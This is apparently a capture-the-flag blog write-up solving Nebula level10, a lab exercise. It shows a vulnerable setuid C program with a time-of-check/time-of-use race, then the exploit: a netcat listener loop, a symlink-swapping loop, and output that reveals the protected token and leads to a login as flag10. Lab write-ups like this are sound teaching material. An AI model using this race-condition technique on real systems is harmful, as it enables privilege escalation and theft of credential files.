+++
author = "pwntester"
categories = ["nebula10"]
date = 2013-11-23T11:35:00Z
description = ""
draft = false
slug = "nebula-level10-write-up"
tags = ["nebula10"]
title = "Nebula level10 write-up"

+++

In [Level10](http://exploit-exercises.com/nebula/level10) we are given a vulnerable piece of code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
 char *file;
 char *host;

 if(argc < 3) {
  printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
  exit(1);
 }

 file = argv[1];
 host = argv[2];

 if(access(argv[1], R_OK) == 0) {
  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];

  printf("Connecting to %s:18211 .. ", host); fflush(stdout);

  fd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);

  if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
   printf("Unable to connect to host %s\n", host);
   exit(EXIT_FAILURE);
  }

#define HITHERE ".oO Oo.\n"
  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
   printf("Unable to write banner to host %s\n", host);
   exit(EXIT_FAILURE);
  }
#undef HITHERE

  printf("Connected!\nSending file .. "); fflush(stdout);

  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
   printf("Damn. Unable to open file\n");
   exit(EXIT_FAILURE);
  }

  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
   printf("Unable to read from file: %s\n", strerror(errno));
   exit(EXIT_FAILURE);
  }

  write(fd, buffer, rc);

  printf("wrote file!\n");

 } else {
  printf("You don't have access to %s\n", file);
 }
}
```

There is a clear **TOCTOU** (Time of check, Time of use) vulnerability. The code checks if the file belongs can be accessed by the user calling the application and if so, it sends it over the wire. The problem is that  there is no guarantee that the file that is sent is the same one that was checked with **access()** and we can try to exploit this **race condition** by being faster than the code :D
In order to do so we will need different moving parts:

* A listener waiting for the token. We will implement this using **netcat**. We will simply loop **nc** so that it accepts new connections when done with the previous one. We will also output whatever we receive to the **out** file. We will look for our token there:

```lang-bash line-numbers 
level10@nebula:~$ while true; do nc -lnp 18211 >> out; done
```

* We will create a fake token file that belongs to us so we can use the **flag10** program to send it to any host. We will place it on /tmp/faketoken and it will contain "wrong token, keep trying!":

```lang-bash line-numbers 
level10@nebula:~$ echo "wrong token, keep trying!" > /tmp/faketoken
```

* We will start a loop that creates a symbolic link in /home/level10/token pointing to /tmp/faketoken and will alternate it with the real token at /home/flag10/token:

```lang-bash line-numbers 
level10@nebula:~$ while true; do ln -fs /tmp/faketoken token; ln -fs /home/flag10/token token; done
```

* All we need to do now is start the **flag10** program:

```lang-bash line-numbers 
level10@nebula:~$ while true; do /home/flag10/flag10 /home/level10/token 127.0.0.1; done
```

* Tailing **/home/level10/out** we will see the token appear very quickly:

```lang-bash line-numbers 
level10@nebula:~$ tail -f out
oO Oo.
wrong token, keep trying!
.oO Oo.
wrong token, keep trying!
.oO Oo.
wrong token, keep trying!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
wrong token, keep trying!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
...
...
```

* Login as flag10 and get the flag:
```lang-bash line-numbers 
alvaro@winterfell ~> ssh flag10@nebula

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


flag10@nebula's password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '12.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

flag10@nebula:~$ id
uid=989(flag10) gid=989(flag10) groups=989(flag10)
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Voila!!





